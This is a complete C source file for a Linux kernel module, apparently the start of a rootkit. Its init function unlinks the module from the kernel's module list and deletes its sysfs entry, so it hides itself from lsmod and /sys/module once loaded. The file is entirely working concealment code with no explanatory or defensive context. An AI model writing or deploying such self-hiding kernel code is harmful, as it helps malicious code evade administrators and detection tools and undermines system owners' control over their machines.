#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/netdevice.h>
#include <linux/list.h>
 
MODULE_LICENSE("Dual BSD/GPL");
 
static int __init rl_init(void)
{
    printk("RL Module init!\n");
	mutex_lock(&module_mutex);
	list_del_init(&THIS_MODULE->list);
	mutex_unlock(&module_mutex);
#ifdef CONFIG_SYSFS
	kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
	return 0;
}
 
static void __exit rl_exit(void)
{
    printk("RL Module exit!\n");
}
module_init(rl_init);
module_exit(rl_exit);
